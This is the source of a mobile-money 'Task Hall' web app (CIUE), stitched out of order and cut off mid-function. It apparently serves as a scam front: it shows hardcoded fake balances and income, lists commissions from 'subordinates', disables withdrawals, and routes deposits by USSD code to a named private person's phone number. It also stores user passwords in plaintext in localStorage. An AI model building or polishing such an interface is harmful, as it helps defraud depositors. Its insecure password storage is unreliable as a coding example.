      showMessage('Registration successful! Welcome to CIUE!');
      
      // Show dashboard
      setTimeout(() => {
        showDashboard(phone);
      }, 1000);
    }

    // Handle Login
    function handleLogin(event) {
      event.preventDefault();
      
      const phone = document.getElementById('loginPhone').value.trim();
      const password = document.getElementById('loginPassword').value;
      
      if (!phone || !password) {
        showMessage('Please enter phone number and password', false);
        return;
      }
      
      const users = JSON.parse(localStorage.getItem('cueUsers') || '{}');
      const user = users[phone];
      
      if (!user || user.password !== password) {
        showMessage('Invalid phone number or password', false);
        return;
      }
      
      localStorage.setItem('currentUser', phone);
      
      showMessage('Login successful! Welcome back!');
      
      setTimeout(() => {
        showDashboard(phone);
      }, 1000);
    }

    // Show dashboard with user info
    function showDashboard(phone) {
      const users = JSON.parse(localStorage.getItem('cueUsers') || '{}');
      const user = users[phone];
      
      if (!user) return;
      
      document.getElementById('balanceAmount').innerHTML = `${(user.balance || 12500).toLocaleString()} <small>UGX</small>`;
      
      // Update profile page with user data
      document.getElementById('profileName').textContent = user.fullName || 'Regular Employee';
      document.getElementById('profileDisplayName').textContent = user.fullName.split(' ')[0] || 'User';
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>CIUE · Welcome</title>
  <!-- Font Awesome 6 (free) -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background: #ffffff;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      width: 100%;
      padding: 0; /* Remove padding */
      margin: 0;
    }

    /* phone frame - NOW FILLS FULL SCREEN */
    .phone {
      max-width: 100%; /* Full width */
      width: 100%;
      height: 100vh; /* Full viewport height */
      background-color: #ffffff;
      border-radius: 0; /* Remove border radius for full screen */
      box-shadow: none; /* Remove shadow for full screen */
      overflow: hidden;
      padding: 20px 16px 0px 16px;
      display: flex;
      flex-direction: column;
    }

    /* If you want to keep the phone frame look on larger screens */
    @media (min-width: 430px) {
      body {
        background: #f0f0f0;
        padding: 16px;
      }
      
      .phone {
        max-width: 390px;
        height: 95vh;
        border-radius: 40px;
        box-shadow: 0 25px 60px rgba(0, 20, 30, 0.15);
        padding: 30px 20px 0px 20px;
      }
    }

    /* Auth Pages */
    .auth-container {
      padding: 10px 0;
      height: 100%;
      overflow-y: auto;
    }

    .logo-area {
      text-align: center;
      margin-bottom: 25px;
    }

    .logo-icon {
      width: 80px;
      height: 80px;
      background: linear-gradient(135deg, #006a7a, #00bcd4);
      border-radius: 30px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 15px;
      color: white;
      font-size: 2.5rem;
      box-shadow: 0 10px 25px rgba(0,150,170,0.3);
    }

    .logo-area h1 {
      color: #003d4d;
      font-size: 2rem;
      font-weight: 700;
      margin-bottom: 5px;
    }

    .logo-area p {
      color: #597e89;
      font-size: 0.9rem;
    }

    .auth-tabs {
      display: flex;
      background: #ecf7f9;
      border-radius: 60px;
      padding: 5px;
      margin-bottom: 25px;
    }

    .auth-tab {
      flex: 1;
      text-align: center;
      padding: 12px;
      border-radius: 60px;
      font-weight: 600;
      color: #006a7a;
      cursor: pointer;
      transition: all 0.2s;
    }

    .auth-tab.active {
      background: white;
      color: #003d4d;
      box-shadow: 0 4px 10px rgba(0,150,160,0.15);
    }

    .auth-form {
      display: none;
    }

    .auth-form.active {
      display: block;
    }

    .form-group {
      margin-bottom: 20px;
    }

    .form-group label {
      display: block;
      color: #003d4d;
      font-weight: 600;
      margin-bottom: 8px;
      font-size: 0.9rem;
    }

    .input-icon {
      position: relative;
      display: flex;
      align-items: center;
    }

    .input-icon i {
      position: absolute;
      left: 15px;
      color: #00acc1;
      font-size: 1.1rem;
    }

    .input-icon input,
    .input-icon select {
      width: 100%;
      padding: 15px 15px 15px 45px;
      border: 2px solid #e0f0f3;
      border-radius: 30px;
      font-size: 1rem;
      outline: none;
      transition: all 0.2s;
      background: white;
    }

    .input-icon input:focus,
    .input-icon select:focus {
      border-color: #00bcd4;
      box-shadow: 0 0 0 3px rgba(0,188,212,0.1);
    }

    .country-select {
      width: 100%;
      padding: 15px 15px 15px 45px;
      border: 2px solid #e0f0f3;
      border-radius: 30px;
      font-size: 1rem;
      outline: none;
      background: white;
      color: #003d4d;
      cursor: pointer;
    }

    .password-hint {
      font-size: 0.8rem;
      color: #597e89;
      margin-top: 5px;
    }

    .auth-btn {
      background: linear-gradient(135deg, #006a7a, #00bcd4);
      color: white;
      border: none;
      width: 100%;
      padding: 18px;
      border-radius: 40px;
      font-size: 1.2rem;
      font-weight: 700;
      margin: 20px 0 15px;
      cursor: pointer;
      transition: 0.2s;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }

    .auth-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 25px rgba(0,150,170,0.4);
    }

    .auth-footer {
      text-align: center;
      color: #597e89;
      font-size: 0.9rem;
    }

    .auth-footer a {
      color: #006a7a;
      font-weight: 600;
      text-decoration: none;
    }

    .terms {
      text-align: center;
      font-size: 0.8rem;
      color: #89b8c5;
      margin-top: 20px;
    }

    .terms a {
      color: #006a7a;
      text-decoration: none;
    }

    /* Success Message */
    .success-message {
      background: #d4edda;
      color: #155724;
      padding: 15px;
      border-radius: 30px;
      text-align: center;
      margin-bottom: 20px;
      border: 2px solid #c3e6cb;
      display: none;
    }

    .success-message i {
      margin-right: 8px;
    }

    /* Main Dashboard (hidden initially) */
    #mainDashboard, #profilePage, #levelPage {
      display: none;
      flex-direction: column;
      height: 100%;
    }

    /* Scrollable content area */
    .scroll-content {
      flex: 1;
      overflow-y: auto;
      padding-bottom: 10px;
    }

    /* Welcome Section */
    .welcome-section {
      margin-bottom: 30px;
    }

    .welcome-title {
      font-size: 2.2rem;
      font-weight: 700;
      color: #000000;
      line-height: 1.2;
      margin-bottom: 5px;
    }

    .welcome-subtitle {
      font-size: 1rem;
      font-weight: 400;
      color: #333333;
      line-height: 1.4;
      margin-bottom: 20px;
      max-width: 90%;
    }

    .divider-line {
      width: 100%;
      height: 1px;
      background-color: #e0e0e0;
      margin: 15px 0;
    }

    /* Collaboration Text */
    .collab-title {
      font-size: 1.1rem;
      font-weight: 600;
      color: #000000;
      margin-bottom: 20px;
    }

    .collab-title i {
      color: #006a7a;
      margin-right: 8px;
    }

    /* Task Hall Section */
    .task-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 20px;
    }

    .task-header h3 {
      font-size: 1.5rem;
      font-weight: 700;
      color: #000000;
    }

    .teaser-badge {
      background: #333333;
      color: white;
      padding: 6px 16px;
      border-radius: 30px;
      font-size: 0.8rem;
      font-weight: 600;
      display: inline-block;
      letter-spacing: 0.5px;
    }

    /* Card Grid */
    .card-grid {
      display: flex;
      flex-direction: column;
      gap: 15px;
      margin-bottom: 30px;
    }

    .reward-card {
      background: #ffffff;
      border-radius: 0;
      padding: 15px 0;
      display: flex;
      align-items: center;
      justify-content: space-between;
      border-bottom: 1px solid #f0f0f0;
    }

    .card-left {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .card-title {
      font-weight: 600;
      font-size: 1.1rem;
      color: #000000;
    }

    .card-value {
      font-weight: 700;
      font-size: 1.1rem;
      color: #000000;
    }

    .card-value small {
      font-size: 0.8rem;
      font-weight: 400;
      color: #666666;
      margin-left: 2px;
    }

    /* Action Row - Updated to match image with bullet points */
    .action-row {
      display: flex;
      flex-direction: column;
      gap: 10px;
      margin: 25px 0 20px 0;
    }

    .action-item {
      display: flex;
      align-items: center;
      gap: 10px;
      color: #000000;
      font-weight: 500;
      font-size: 1rem;
      cursor: pointer;
    }

    .action-item span {
      font-size: 1rem;
    }

    .action-item span:before {
      content: "• ";
      font-weight: bold;
    }

    .company-line {
      display: flex;
      align-items: center;
      justify-content: space-between;
      background: white;
      padding: 15px 0;
      border-bottom: 1px solid #f0f0f0;
      margin-bottom: 20px;
    }

    .company-line span {
      font-weight: 500;
      color: #000000;
      font-size: 1rem;
    }

    .company-line i {
      color: #000000;
      font-size: 1rem;
    }

    /* Bottom Navigation - FIXED AT BOTTOM */
    .bottom-nav {
      display: flex;
      align-items: center;
      justify-content: space-around;
      background: #ffffff;
      padding: 15px 0 10px 0;
      border-top: 1px solid #f0f0f0;
      width: 100%;
      background-color: white;
      flex-shrink: 0;
      margin-top: auto;
    }

    .nav-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      color: #999999;
      font-size: 0.75rem;
      font-weight: 500;
      gap: 4px;
      cursor: pointer;
    }

    .nav-item i {
      font-size: 1.3rem;
      color: #999999;
    }

    .nav-item.active {
      color: #000000;
    }

    .nav-item.active i {
      color: #000000;
    }

    /* Balance Display */
    .balance-container {
      background: #f9f9f9;
      border-radius: 10px;
      padding: 15px;
      margin-bottom: 25px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      border: 1px solid #eaeaea;
    }

    .balance-label {
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .balance-label i {
      font-size: 1.5rem;
      color: #333;
    }

    .balance-info h4 {
      color: #666;
      font-size: 0.8rem;
      font-weight: 400;
    }

    .balance-info .amount {
      font-size: 1.5rem;
      font-weight: 700;
      color: #000;
      line-height: 1.2;
    }

    .balance-info .amount small {
      font-size: 0.8rem;
      font-weight: 400;
      color: #666;
    }

    .history-btn {
      background: none;
      border: 1px solid #ddd;
      padding: 8px 12px;
      border-radius: 20px;
      color: #333;
      font-weight: 500;
      cursor: pointer;
      font-size: 0.8rem;
    }

    .logout-btn {
      background: none;
      border: 1px solid #ddd;
      color: #333;
      padding: 8px 15px;
      border-radius: 20px;
      cursor: pointer;
      font-size: 0.9rem;
    }

    .logout-btn:hover {
      background: #f5f5f5;
    }

    /* PROFILE PAGE STYLES */
    .profile-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
    }

    .time {
      font-size: 1rem;
      font-weight: 500;
      color: #000;
    }

    .profile-title {
      font-size: 1.2rem;
      font-weight: 600;
      color: #000;
    }

    .profile-title i {
      margin-right: 5px;
    }

    .employee-info {
      margin-bottom: 25px;
    }

    .employee-name {
      font-size: 1.3rem;
      font-weight: 700;
      color: #000;
      margin-bottom: 5px;
    }

    .employee-role {
      font-size: 0.9rem;
      color: #666;
      font-weight: 400;
    }

    /* Wallet Cards */
    .wallet-grid {
      display: flex;
      gap: 15px;
      margin-bottom: 25px;
    }

    .wallet-card {
      flex: 1;
      background: #f9f9f9;
      border-radius: 15px;
      padding: 15px;
      border: 1px solid #eaeaea;
    }

    .wallet-label {
      font-size: 0.8rem;
      color: #666;
      margin-bottom: 5px;
    }

    .wallet-amount {
      font-size: 1.1rem;
      font-weight: 700;
      color: #000;
    }

    .wallet-amount small {
      font-size: 0.7rem;
      font-weight: 400;
      color: #999;
      margin-left: 2px;
    }

    /* Action Buttons */
    .wallet-actions {
      display: flex;
      gap: 20px;
      margin-bottom: 25px;
    }

    .wallet-action-btn {
      display: flex;
      align-items: center;
      gap: 8px;
      background: none;
      border: none;
      font-size: 1rem;
      font-weight: 500;
      color: #000;
      cursor: pointer;
    }

    .wallet-action-btn i {
      font-size: 1.1rem;
    }

    /* Income Grid */
    .income-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 15px;
      margin-bottom: 25px;
    }

    .income-item {
      border-bottom: 1px solid #f0f0f0;
      padding-bottom: 8px;
    }

    .income-label {
      font-size: 0.8rem;
      color: #666;
      margin-bottom: 3px;
    }

    .income-value {
      font-size: 1.1rem;
      font-weight: 700;
      color: #000;
    }

    .income-value small {
      font-size: 0.7rem;
      font-weight: 400;
      color: #999;
      margin-left: 2px;
    }

    /* Commission Row */
    .commission-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 15px 0;
      border-top: 1px solid #eaeaea;
      border-bottom: 1px solid #eaeaea;
      margin-bottom: 20px;
    }

    .commission-label {
      font-size: 0.9rem;
      color: #000;
    }

    .commission-value {
      font-size: 1.1rem;
      font-weight: 700;
      color: #000;
    }

    .commission-value small {
      font-size: 0.7rem;
      font-weight: 400;
      color: #999;
    }

    /* Menu Grid */
    .menu-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 20px;
      margin-bottom: 30px;
    }

    .menu-item {
      display: flex;
      align-items: center;
      gap: 10px;
      font-size: 0.95rem;
      color: #000;
    }

    .menu-item i {
      font-size: 1rem;
      color: #666;
      width: 20px;
    }

    /* Deposit Modal Styles */
    .modal-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.5);
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }

    .modal-content {
      background: white;
      max-width: 390px;
      width: 90%;
      border-radius: 30px;
      padding: 24px;
      box-shadow: 0 30px 60px rgba(0,0,0,0.2);
      max-height: 90vh;
      overflow-y: auto;
    }

    .modal-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
    }

    .modal-header h2 {
      color: #000;
      font-size: 1.4rem;
    }

    .close-btn {
      background: none;
      border: none;
      font-size: 1.8rem;
      color: #999;
      cursor: pointer;
    }

    .recipient-card {
      background: #f9f9f9;
      border-radius: 15px;
      padding: 16px;
      margin-bottom: 20px;
      text-align: center;
      border: 1px solid #eaeaea;
    }

    .recipient-card .number {
      font-size: 1.3rem;
      font-weight: 700;
      color: #000;
    }

    .recipient-card .name {
      color: #666;
      font-weight: 500;
      margin-top: 5px;
    }

    .deposit-option {
      background: #f9f9f9;
      border: 1px solid #eaeaea;
      border-radius: 15px;
      padding: 15px;
      margin-bottom: 12px;
      display: flex;
      align-items: center;
      gap: 15px;
      cursor: pointer;
    }

    .deposit-option:hover {
      background: #f0f0f0;
    }

    .deposit-option i {
      font-size: 1.8rem;
      color: #333;
    }

    .deposit-option .info h3 {
      color: #000;
      font-size: 1.1rem;
      margin-bottom: 3px;
    }

    .deposit-option .info p {
      color: #666;
      font-size: 0.8rem;
    }

    .custom-amount input {
      width: 100%;
      padding: 15px;
      border: 1px solid #ddd;
      border-radius: 15px;
      font-size: 1rem;
      text-align: center;
    }

    .ussd-code {
      background: #f5f5f5;
      padding: 15px;
      border-radius: 15px;
      text-align: center;
      margin: 15px 0;
      font-size: 1.1rem;
      font-weight: 600;
      color: #000;
      border: 1px solid #ddd;
    }

    .deposit-btn {
      background: #000;
      color: white;
      border: none;
      width: 100%;
      padding: 16px;
      border-radius: 30px;
      font-size: 1.1rem;
      font-weight: 600;
      margin-top: 15px;
      cursor: pointer;
    }

    .deposit-btn:hover {
      background: #333;
    }

    /* Email notification styles */
    .email-notice {
      background: #fff3cd;
      color: #856404;
      padding: 10px;
      border-radius: 30px;
      font-size: 0.8rem;
      text-align: center;
      margin: 10px 0;
      border: 1px solid #ffeeba;
      display: none;
    }

    .email-notice i {
      margin-right: 5px;
    }

    /* Level Page Styles */
    .level-header {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 200px;
    }

    .level-title {
      color: #ff0000;
      font-size: 2rem;
      font-weight: 800;
      letter-spacing: 2px;
      text-transform: uppercase;
      white-space: nowrap;
      text-align: center;
    }

    /* Make action items display as bullet points */
    .action-item span:before {
      content: "• ";
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="phone">
    <!-- AUTHENTICATION SECTION -->
    <div id="authContainer" class="auth-container">
      <div class="logo-area">
        <div class="logo-icon">
          <i class="fas fa-hand-holding-heart"></i>
        </div>
        <h1>CIUE</h1>
        <p>Mobile Money • Earn • Task Hall</p>
      </div>

      <!-- Success/Error Message -->
      <div id="messageBox" class="success-message">
        <i class="fas fa-check-circle"></i> <span id="messageText"></span>
      </div>

      <!-- Email notification status -->
      <div id="emailNotice" class="email-notice">
        <i class="fas fa-envelope"></i> <span id="emailStatus"></span>
      </div>

      <!-- Auth Tabs -->
      <div class="auth-tabs">
        <div class="auth-tab active" onclick="switchAuthTab('login')" id="loginTab">Login</div>
        <div class="auth-tab" onclick="switchAuthTab('register')" id="registerTab">Register</div>
      </div>

      <!-- LOGIN FORM -->
      <div id="loginForm" class="auth-form active">
        <form onsubmit="handleLogin(event)">
          <div class="form-group">
            <label>Phone Number</label>
            <div class="input-icon">
              <i class="fas fa-phone-alt"></i>
              <input type="tel" id="loginPhone" placeholder="Enter your phone number" required>
            </div>
          </div>

          <div class="form-group">
            <label>Password</label>
            <div class="input-icon">
              <i class="fas fa-lock"></i>
              <input type="password" id="loginPassword" placeholder="Enter your password" required>
            </div>
          </div>

          <button type="submit" class="auth-btn">
            <i class="fas fa-sign-in-alt"></i> Login
          </button>

          <div class="auth-footer">
            Don't have an account? <a href="#" onclick="switchAuthTab('register'); return false;">Register now</a>
          </div>
        </form>
      </div>

      <!-- REGISTRATION FORM -->
      <div id="registerForm" class="auth-form">
        <form id="registrationForm" onsubmit="handleRegisterWithEmail(event)">
          <div class="form-group">
            <label>Full Names</label>
            <div class="input-icon">
              <i class="fas fa-user"></i>
              <input type="text" id="regFullName" placeholder="Enter your full names" required>
            </div>
          </div>

          <div class="form-group">
            <label>Phone Number</label>
            <div class="input-icon">
              <i class="fas fa-phone-alt"></i>
              <input type="tel" id="regPhone" placeholder="Enter your phone number" required>
            </div>
          </div>

          <div class="form-group">
            <label>Country</label>
            <div class="input-icon">
              <i class="fas fa-globe-africa"></i>
              <select id="regCountry" class="country-select" required>
                <option value="">Select your country</option>
                <option value="Uganda">Uganda 🇺🇬</option>
                <option value="Kenya">Kenya 🇰🇪</option>
                <option value="Tanzania">Tanzania 🇹🇿</option>
                <option value="Burundi">Burundi 🇧🇮</option>
                <option value="South Sudan">South Sudan 🇸🇸</option>
              </select>
            </div>
          </div>

          <div class="form-group">
            <label>Password</label>
            <div class="input-icon">
              <i class="fas fa-lock"></i>
              <input type="password" id="regPassword" placeholder="Create a password" required>
            </div>
            <div class="password-hint">Minimum 6 characters</div>
          </div>

          <div class="form-group">
            <label>Confirm Password</label>
            <div class="input-icon">
              <i class="fas fa-lock"></i>
              <input type="password" id="regConfirmPassword" placeholder="Confirm your password" required>
            </div>
          </div>

          <button type="submit" class="auth-btn">
            <i class="fas fa-user-plus"></i> Register
          </button>

          <div class="auth-footer">
            Already have an account? <a href="#" onclick="switchAuthTab('login'); return false;">Login here</a>
          </div>

          <div class="terms">
            By registering, you agree to our <a href="#">Terms</a> and <a href="#">Privacy Policy</a>
          </div>
        </form>
      </div>
    </div>

    <!-- MAIN DASHBOARD (Home Page) -->
    <div id="mainDashboard">
      <!-- Scrollable content area -->
      <div class="scroll-content">
        <!-- Welcome header -->
        <div class="welcome-section">
          <div class="welcome-title">WELCOME</div>
          <div class="welcome-subtitle">NEW OPPORTUNITIES AND CHALLENGES WORK TOGETHER TO CREATE A BETTER FUTURE</div>
          <div class="divider-line"></div>
        </div>

        <!-- Balance Display -->
        <div class="balance-container">
          <div class="balance-label">
            <i class="fas fa-wallet"></i>
            <div class="balance-info">
              <h4>Available Balance</h4>
              <div class="amount" id="balanceAmount">12,500 <small>UGX</small></div>
            </div>
          </div>
          <button class="history-btn" onclick="showHistory()"><i class="fas fa-history"></i> History</button>
        </div>

        <!-- Collaboration text -->
        <div class="collab-title">
          Collaboration. We Believe That Every Employee Can:
        </div>

        <!-- Task Hall section -->
        <div class="task-header">
          <h3>Task Hall</h3>
          <span class="teaser-badge">TEASER</span>
        </div>

        <!-- Cards -->
        <div class="card-grid">
          <div class="reward-card">
            <div class="card-left">
              <span class="card-title">TEASER</span>
            </div>
            <div class="card-value">+1200.00 <small>UGX</small></div>
          </div>
          
          <div class="reward-card">
            <div class="card-left">
              <span class="card-title">VAF</span>
            </div>
            <div class="card-value">+1200.00 <small>UGX</small></div>
          </div>
          
          <div class="reward-card">
            <div class="card-left">
              <span class="card-title">Out of Ideas</span>
            </div>
            <div class="card-value">+1200.00 <small>UGX</small></div>
          </div>
        </div>

        <!-- Action row with bullet points -->
        <div class="action-row">
          <div class="action-item" onclick="openDepositModal()">
            <span>Recharge</span>
          </div>
          <div class="action-item" onclick="alert('Withdraw feature coming soon!')">
            <span>Withdraw</span>
          </div>
          <div class="action-item" onclick="alert('Company profile')">
            <span>Company Profile</span>
          </div>
        </div>

        <!-- Company Profile line -->
        <div class="company-line">
          <span>Company Profile</span>
          <i class="fas fa-chevron-right"></i>
        </div>
      </div>

      <!-- Bottom navigation -->
      <div class="bottom-nav">
        <div class="nav-item active" onclick="showHomePage()">
          <i class="fas fa-home"></i>
          <span>Home</span>
        </div>
        <div class="nav-item" onclick="alert('Task page coming soon')">
          <i class="fas fa-tasks"></i>
          <span>Task</span>
        </div>
        <div class="nav-item" onclick="showLevelPage()">
          <i class="fas fa-chart-simple"></i>
          <span>Level</span>
        </div>
        <div class="nav-item" onclick="alert('Income page coming soon')">
          <i class="fas fa-coins"></i>
          <span>Income</span>
        </div>
        <div class="nav-item" onclick="showProfilePage()">
          <i class="fas fa-user"></i>
          <span>Me</span>
        </div>
      </div>
    </div>

    <!-- PROFILE PAGE (Me Page) -->
    <div id="profilePage">
      <!-- Scrollable content area -->
      <div class="scroll-content">
        <!-- Header with time -->
        <div class="profile-header">
          <span class="time" id="currentTime">9:24 PM</span>
          <span class="profile-title"><i class="fas fa-user"></i> <span id="profileDisplayName">User</span></span>
        </div>

        <!-- Employee info -->
        <div class="employee-info">
          <div class="employee-name" id="profileName">Regular Employee</div>
          <div class="employee-role">Regular Employee</div>
        </div>

        <!-- Wallet cards -->
        <div class="wallet-grid">
          <div class="wallet-card">
            <div class="wallet-label">Main wallet</div>
            <div class="wallet-amount" id="mainWallet">0.00 <small>UGX</small></div>
          </div>
          <div class="wallet-card">
            <div class="wallet-label">Commission wallet</div>
            <div class="wallet-amount" id="commissionWallet">387,566.50 <small>UGX</small></div>
          </div>
        </div>

        <!-- Action buttons -->
        <div class="wallet-actions">
          <button class="wallet-action-btn" onclick="openDepositModal()">
            <i class="fas fa-lock"></i> Recharge
          </button>
          <button class="wallet-action-btn" onclick="alert('Withdraw feature coming soon')">
            <i class="fas fa-folder"></i> Withdraw
          </button>
        </div>

        <!-- Income grid -->
        <div class="income-grid">
          <div class="income-item">
            <div class="income-label">yesterday's income</div>
            <div class="income-value" id="yesterdayIncome">565.00 <small>UGX</small></div>
          </div>
          <div class="income-item">
            <div class="income-label">today's income</div>
            <div class="income-value" id="todayIncome">72,340.00 <small>UGX</small></div>
          </div>
          <div class="income-item">
            <div class="income-label">total income</div>
            <div class="income-value" id="totalIncome">713,066.50 <small>UGX</small></div>
          </div>
          <div class="income-item">
            <div class="income-label">this week's income</div>
            <div class="income-value" id="weekIncome">72,340.00 <small>UGX</small></div>
          </div>
          <div class="income-item">
            <div class="income-label">this month's income</div>
            <div class="income-value" id="monthIncome">387,461.50 <small>UGX</small></div>
          </div>
        </div>

        <!-- Commission from subordinates -->
        <div class="commission-row">
          <span class="commission-label">Commission from subordinate tasks</span>
          <span class="commission-value" id="subordinateCommission">1,096.50 <small>UGX</small></span>
        </div>

        <!-- Menu grid -->
        <div class="menu-grid">
          <div class="menu-item"><i class="fas fa-clipboard-list"></i> task record</div>
          <div class="menu-item"><i class="fas fa-users"></i> team report</div>
          <div class="menu-item"><i class="fas fa-calendar-alt"></i> daily report</div>
          <div class="menu-item"><i class="fas fa-file-invoice"></i> bill record</div>
          <div class="menu-item"><i class="fas fa-chart-line"></i> Position Salary</div>
          <div class="menu-item"><i class="fas fa-download"></i> APP download</div>
        </div>

        <!-- Logout button -->
        <div style="text-align: center; margin-top: 20px; margin-bottom: 20px;">
          <button class="logout-btn" onclick="logout()">
            <i class="fas fa-sign-out-alt"></i> Logout
          </button>
        </div>
      </div>

      <!-- Bottom navigation -->
      <div class="bottom-nav">
        <div class="nav-item" onclick="showHomePage()">
          <i class="fas fa-home"></i>
          <span>Home</span>
        </div>
        <div class="nav-item" onclick="alert('Task page coming soon')">
          <i class="fas fa-tasks"></i>
          <span>Task</span>
        </div>
        <div class="nav-item" onclick="showLevelPage()">
          <i class="fas fa-chart-simple"></i>
          <span>Level</span>
        </div>
        <div class="nav-item" onclick="alert('Income page coming soon')">
          <i class="fas fa-coins"></i>
          <span>Income</span>
        </div>
        <div class="nav-item active" onclick="showProfilePage()">
          <i class="fas fa-user"></i>
          <span>Me</span>
        </div>
      </div>
    </div>

    <!-- LEVEL PAGE -->
    <div id="levelPage">
      <!-- Scrollable content area -->
      <div class="scroll-content">
        <!-- Level header in RED CAPITAL LETTERS - ONE LINE -->
        <div class="level-header">
          <h1 class="level-title">LEVEL PRICE AND INCOME</h1>
        </div>
        
        <!-- You can add more level content here later -->
        <div style="text-align: center; color: #666; margin-top: 50px;">
          <p>Level details coming soon...</p>
        </div>
      </div>

      <!-- Bottom navigation -->
      <div class="bottom-nav">
        <div class="nav-item" onclick="showHomePage()">
          <i class="fas fa-home"></i>
          <span>Home</span>
        </div>
        <div class="nav-item" onclick="alert('Task page coming soon')">
          <i class="fas fa-tasks"></i>
          <span>Task</span>
        </div>
        <div class="nav-item active" onclick="showLevelPage()">
          <i class="fas fa-chart-simple"></i>
          <span>Level</span>
        </div>
        <div class="nav-item" onclick="alert('Income page coming soon')">
          <i class="fas fa-coins"></i>
          <span>Income</span>
        </div>
        <div class="nav-item" onclick="showProfilePage()">
          <i class="fas fa-user"></i>
          <span>Me</span>
        </div>
      </div>
    </div>
  </div>

  <!-- DEPOSIT MODAL -->
  <div class="modal-overlay" id="depositModal">
    <div class="modal-content">
      <div class="modal-header">
        <h2><i class="fas fa-mobile-alt"></i> Mobile Money</h2>
        <button class="close-btn" onclick="closeDepositModal()">&times;</button>
      </div>
      
      <!-- Recipient info -->
      <div class="recipient-card">
        <div class="number">0756 673 144</div>
        <div class="name">NAMUHANGA VERONIC</div>
      </div>

      <!-- Quick deposit options -->
      <div class="deposit-option" onclick="setDepositAmount(10000)">
        <i class="fas fa-bolt"></i>
        <div class="info">
          <h3>10,000 UGX</h3>
          <p>Quick deposit</p>
        </div>
      </div>
      
      <div class="deposit-option" onclick="setDepositAmount(50000)">
        <i class="fas fa-star"></i>
        <div class="info">
          <h3>50,000 UGX</h3>
          <p>Most popular</p>
        </div>
      </div>
      
      <div class="deposit-option" onclick="setDepositAmount(100000)">
        <i class="fas fa-crown"></i>
        <div class="info">
          <h3>100,000 UGX</h3>
          <p>Premium</p>
        </div>
      </div>
      
      <!-- Custom amount -->
      <div class="custom-amount">
        <input type="number" id="customAmount" placeholder="Enter amount (UGX)" min="1000" step="1000">
      </div>

      <!-- USSD Code Display -->
      <div class="ussd-code" id="ussdDisplay">
        *165*1*0756673144*<span id="amountDisplay">AMOUNT</span>#
      </div>
      
      <button class="deposit-btn" onclick="processDeposit()">
        <i class="fas fa-mobile-alt"></i> Pay with Mobile Money
      </button>
      
      <!-- Transaction history -->
      <div id="historySection" style="display: none;" class="transaction-history">
        <h3 style="margin-bottom: 10px;">Recent deposits</h3>
        <div id="transactionList"></div>
      </div>
    </div>
  </div>

  <script>
    // Show message function
    function showMessage(text, isSuccess = true) {
      const msgBox = document.getElementById('messageBox');
      const msgText = document.getElementById('messageText');
      msgText.textContent = text;
      msgBox.style.display = 'block';
      msgBox.style.background = isSuccess ? '#d4edda' : '#f8d7da';
      msgBox.style.color = isSuccess ? '#155724' : '#721c24';
      msgBox.style.borderColor = isSuccess ? '#c3e6cb' : '#f5c6cb';
      
      setTimeout(() => {
        msgBox.style.display = 'none';
      }, 3000);
    }

    // Show email status
    function showEmailStatus(text, isSuccess = true) {
      const emailNotice = document.getElementById('emailNotice');
      const emailStatus = document.getElementById('emailStatus');
      emailStatus.textContent = text;
      emailNotice.style.display = 'block';
      emailNotice.style.background = isSuccess ? '#d4edda' : '#fff3cd';
      emailNotice.style.color = isSuccess ? '#155724' : '#856404';
      
      setTimeout(() => {
        emailNotice.style.display = 'none';
      }, 4000);
    }

    // Switch between login and register tabs
    function switchAuthTab(tab) {
      const loginForm = document.getElementById('loginForm');
      const registerForm = document.getElementById('registerForm');
      const loginTab = document.getElementById('loginTab');
      const registerTab = document.getElementById('registerTab');
      
      if (tab === 'login') {
        loginForm.classList.add('active');
        registerForm.classList.remove('active');
        loginTab.classList.add('active');
        registerTab.classList.remove('active');
      } else {
        registerForm.classList.add('active');
        loginForm.classList.remove('active');
        registerTab.classList.add('active');
        loginTab.classList.remove('active');
      }
      
      // Clear any values when switching tabs
      document.getElementById('loginPhone').value = '';
      document.getElementById('loginPassword').value = '';
      document.getElementById('regFullName').value = '';
      document.getElementById('regPhone').value = '';
      document.getElementById('regPassword').value = '';
      document.getElementById('regConfirmPassword').value = '';
      document.getElementById('regCountry').value = '';
    }

    // Handle Registration with Email Notification
    async function handleRegisterWithEmail(event) {
      event.preventDefault();
      
      const fullName = document.getElementById('regFullName').value.trim();
      const phone = document.getElementById('regPhone').value.trim();
      const country = document.getElementById('regCountry').value;
      const password = document.getElementById('regPassword').value;
      const confirmPass = document.getElementById('regConfirmPassword').value;
      
      // Validate
      if (!fullName || !phone || !country || !password || !confirmPass) {
        showMessage('Please fill in all fields', false);
        return;
      }
      
      if (password.length < 6) {
        showMessage('Password must be at least 6 characters', false);
        return;
      }
      
      if (password !== confirmPass) {
        showMessage('Passwords do not match', false);
        return;
      }
      
      // Check if user already exists in localStorage
      const users = JSON.parse(localStorage.getItem('cueUsers') || '{}');
      
      if (users[phone]) {
        showMessage('This phone number is already registered. Please login.', false);
        switchAuthTab('login');
        return;
      }
      
      // Show sending status
